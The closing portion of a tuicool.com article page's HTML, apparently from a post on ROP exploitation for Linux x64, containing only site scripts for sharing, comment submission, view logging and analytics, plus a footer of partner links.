                "type" : "slide",
                "bdImg" : "1",
                "bdPos" : "left",
                "bdTop" : "200"
            }
        };
        with (document)
        0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~(-new Date() / 36e5)];
    </script>
</div>

<style type="text/css">
    .btn-large {
        padding: 0;
    }
    .load-fail {
        display: none;
    }
</style>
<script src="http://static1.tuicool.com//assets/highlight.pack.js"></script>
<script type="text/javascript">
    $('table').each(function(i) {
        var size = $(this).children().size();
        if (size > 1) {
            $(this).attr('class',"table table-bordered");
        } else if (size == 1) {
            var e11 = $(this).children(":first");
            var e1 = e11[0];
            var name = e1.nodeName.toLowerCase();
            if ("tbody" == name) {
                if (e1.children.length > 1) {
                    $(this).attr('class',"table table-bordered");
                } else if (e1.children.length == 1){
                    var e12 = e1.children[0];
                    var name2 = e12.nodeName.toLowerCase();
                    if ("tr" == name2) {
                       if (e12.children.length > 1) {
                         $(this).attr('class',"table table-bordered");
                       }
                    }
                }
            }
        }
    });
            related_kan("qmUbiin");
        window.page = 0;
        window.last = 0;    
        window.first = true;
        resize_article_image('#nei', 550);
                load_comments("qmUbiin",1,0,"MTU1Nzky+cefc514b570d92b90ea1fd1a5e720fa78d2ca451");
                window.uid = parseInt("155792");
        open_add_article_to_kan("true");
        async_do_zan_article(); 
        $('pre').each(function(i, e) {
            hljs.highlightBlock(e, "<span class='indent'>  </span>", false)
        });
       
          function commentsub(){  
    $.ajaxSetup({
    error:function(x,e){        
      $('.comment-alert').text("系统出现问题，请稍候再试").show();
      $('textarea').attr('disabled',false);
      return false;
    },
    headers: {
      'X-CSRF-Token': $('meta[name="csrf-token"]').attr('content')
    }
  }); 
    $("#comment-body").attr("disabled",true);
    $("#comment-submit").addClass("disabled");
    $("#comment-submit").attr("href","#comment-body");
    text = $("#comment-body").val();
    if(text.length < 2 ){
        $('.comment-alert').text("你的字数太少了").show();
        reset_submit_btn();
    }else if(text.length > 500){
        $('.comment-alert').text("你的字数太多了,不能超过500字!").show();
        reset_submit_btn();
    }else{      
    $.post("/comments.json", { aid: "qmUbiin", html_body: $("#comment-body").val(), auth: "MTU1Nzky+cefc514b570d92b90ea1fd1a5e720fa78d2ca451"},function(data){
      if(data.success == true){
        $(".comments-list").show();
        var aComment = data.comment;
        var text = aComment.content;
        var id = "qmUbiin";
        var title = "一步一步学ROP之linux_x64篇";
        var share_code = "<ul class='dropdown-menu'><li><a target='blank' href='http://share.baidu.com/s?type=text&amp;searchPic=0&amp;sign=on&amp;to=tsina&amp;url=http://www.tuicool.com/articles/"+id+"&amp;title=分享评论:"+text+" //"+title+"（分享自 @推酷网）'>新浪微博</a></li><li><a target='blank' href='http://share.baidu.com/s?type=text&amp;searchPic=0&amp;sign=on&amp;to=tqq&amp;url=http://www.tuicool.com/articles/"+id+"&amp;title=分享评论:"+text+" //"+title+"（分享自 @tuicool）'>腾讯微博</a></li><li><a target='blank' href='http://s.evernote.com/grclip?url=http://www.tuicool.com/articles/"+id+"&amp;title=分享评论:"+text+" //"+title+"（分享自 @推酷网）'>印象笔记</a></li><li><a target='blank' href='http://share.baidu.com/s?type=text&amp;searchPic=0&amp;sign=on&amp;to=douban&amp;url=http://www.tuicool.com/articles/"+id+"&amp;title=分享评论:"+text+" //"+title+"（分享自 @推酷网）'>豆瓣</a></li><li><a target='blank' href='http://share.baidu.com/s?type=text&amp;searchPic=0&amp;sign=on&amp;to=renren&amp;url=http://www.tuicool.com/articles/"+id+"&amp;title=分享评论:"+text+" //"+title+"（分享自 @推酷网）'>人人网</a></li></ul>"
        $(".comments-list").prepend("<div class='single' id='c-"+aComment.id+"'><img src='"+aComment.avatar+"' class='img avatar'><div class='comment-item' style='padding:0 0 0 5px;'><div class='info mine'>"+"<a class='uname' href='/user/"+ aComment.uid+ "' target='_blank'>"+ aComment.username  +"</a>" +"<span class='timestamp'>" +aComment.timestamp +"</span> <div class='reply dropdown'><a class='dropdown-toggle share' data-toggle='dropdown' href='javascript:share("+aComment.id+");'>分享<b class='caret'></b></a> | <a href='javascript:reply(\""+aComment.username+"\");'>回复</a>"+share_code+"</div> "+ "</div><div class='body' id='comment-"+aComment.id+"'>" + aComment.content + "</div></div></div>");
        $("#comment-body").attr("disabled",false).val("");
        $("#comment-submit").removeClass("disabled");
        $("#comment-submit").attr("href","javascript:commentsub();");
        location = "#c-"+aComment.id
        $('.empty-cmts').hide();
        $('.comment-alert').hide();
        $('.comment_cnt').text(parseInt($('.comment_cnt').text())+1);
       } else{
        $('.comment-alert').text(data.error).show();
        reset_submit_btn();
       }
    },"json");
    }
}
function reset_submit_btn() {
  $('textarea').attr('disabled',false);
  $("#comment-submit").removeClass("disabled");
  $("#comment-submit").attr("href","javascript:commentsub();");
}

       handle_follow_site("#my_follow","已订阅","+ 订阅");
       function log_article(id) {
        $.ajaxSetup({
           headers: {
             'X-CSRF-Token': $('meta[name="csrf-token"]').attr('content')
           },
           error:function(x,t,e){         
             return false;
           }
        });
        $.post("/articles/log", { id : id },function(data){
        });
        }
        function do_log_article(id) {
            window.setTimeout("log_article(\"" + id + "\")",12000);
        }
        do_log_article("qmUbiin");
</script>


    <div class="loader-inner ball-pulse ball-loading-center" id="page-loading" style="display: none">
      <div></div>
      <div></div>
      <div></div>
    </div>
    <div class="read-later-alert"></div>
  </div>

    <div class="footer">
    <div class="footer-inner">
    <dl class="about-link site-link">
        <dt>
            网站相关
        </dt>
        <dd>
            <a target="_blank" href="http://www.tuicool.com/about">关于我们</a>
        </dd>
        <dd>
            <a target="_blank" href="http://www.tuicool.com/mobile">移动应用</a>
        </dd>
        <dd>
            <a target="_blank" href="http://www.tuicool.com/bbs/go/issues">建议反馈</a>
        </dd>
    </dl>
    <dl class="site-link follow-link">
        <dt>
            关注我们
        </dt>
        <dd>
            <a target="_blank" href="http://e.weibo.com/tuicool2012"><img src="http://static1.tuicool.com/images/weibo-32.png">推酷网</a>
        </dd>
        <dd><img src="http://static1.tuicool.com/images/weixin-32.png">tuicool2012
        </dd>
    </dl>
    <dl class="site-link links">
        <dt>
            友情链接
        </dt>
        <dd>
                <a href="http://www.woshipm.com/" title="人人都是产品经理" target="_blank">人人都是产品经理</a>
                <a href="http://www.pm265.com/" title="PM256" target="_blank">PM256</a>
                <a href="http://www.yidonghua.com/" title="移动信息化" target="_blank">移动信息化</a>
                <a href="http://www.snsiu.com/" title="行晓网" target="_blank">行晓网</a>
                <a href="http://www.taskcity.com/" title="智城外包网" target="_blank">智城外包网</a>
                <a href="http://www.huxiu.com/" title="虎嗅" target="_blank">虎嗅</a>
                <a href="http://www.iterduo.com/" title="IT耳朵" target="_blank">IT耳朵</a>
                <a href="http://mediaworks.caixin.com/" title="创媒工场" target="_blank">创媒工场</a>
                <a href="http://www.managershare.com/" title="经理人分享" target="_blank">经理人分享</a>
                <a href="http://www.shichangbu.com/" title="市场部网" target="_blank">市场部网</a>
                <a href="http://www.ikanchai.com/" title="砍柴网" target="_blank">砍柴网</a>
                <a href="http://www.cocoachina.com/" title="CocoaChina" target="_blank">CocoaChina</a>
                <a href="http://www.ibeifeng.com/" title="北风网" target="_blank">北风网</a>
                <a href="http://www.jiankongbao.com/" title="云智慧" target="_blank">云智慧</a>
                <a href="http://www.wyzc.com" title="我赢职场" target="_blank">我赢职场</a>
                <a href="http://www.thebigdata.cn/" title="大数据时代" target="_blank">大数据时代</a>
                <a href="http://www.qidic.com/" title="奇笛网" target="_blank">奇笛网</a>
                <a href="http://www.cngulu.com/" title="咕噜网" target="_blank">咕噜网</a>
                <a href="http://www.linuxdiyf.com/" title="红联linux" target="_blank">红联linux</a>
                <a href="http://win10.ithome.com" title="Win10之家" target="_blank">Win10之家</a>
                <a href="http://www.niaogebiji.com/" title="鸟哥笔记" target="_blank">鸟哥笔记</a>
                <a href="http://www.play.cn" title="爱游戏" target="_blank">爱游戏</a>
                <a href="http://www.investide.cn/" title="投资潮" target="_blank">投资潮</a>
                <a href="http://www.31huiyi.com/" title="31会议网" target="_blank">31会议网</a>
                <a href="https://www.jiguang.cn/" title="极光推送" target="_blank">极光推送</a>
                <a href="https://www.teambition.com/" title="Teambition" target="_blank">Teambition</a>
                <a href="http://www.guigu.org/" title="硅谷网" target="_blank">硅谷网</a>
                <a href="https://home.leangoo.com/" title="leangoo" target="_blank">leangoo</a>
                <a href="http://www.zealer.com/" title="ZEALER中国" target="_blank">ZEALER中国</a>
                <a href="http://www.opensns.cn/" title="OpenSNS" target="_blank">OpenSNS</a>
                <a href="http://www.edu360.cn/" title="小牛学堂" target="_blank">小牛学堂</a>
                <a href="http://www.handone.com/" title="handone" target="_blank">handone</a>
                <a href="http://www.scrumcn.com/" title="Scrum中文网" target="_blank">Scrum中文网</a>
                <a href="http://www.bigniu.com/" title="比戈大牛" target="_blank">比戈大牛</a>
                <a href="https://www.upyun.com/" title="又拍云" target="_blank">又拍云</a>
            <a href="/links">更多链接>></a>&nbsp;&nbsp;
        </dd>
    </dl>
    <div class="clear"></div>
    </div>
</div>

<div style="display:none;">
   <script src="http://s22.cnzz.com/stat.php?id=5541078&web_id=5541078&show=pic" language="JavaScript"></script>
</div>


</body>
</html>
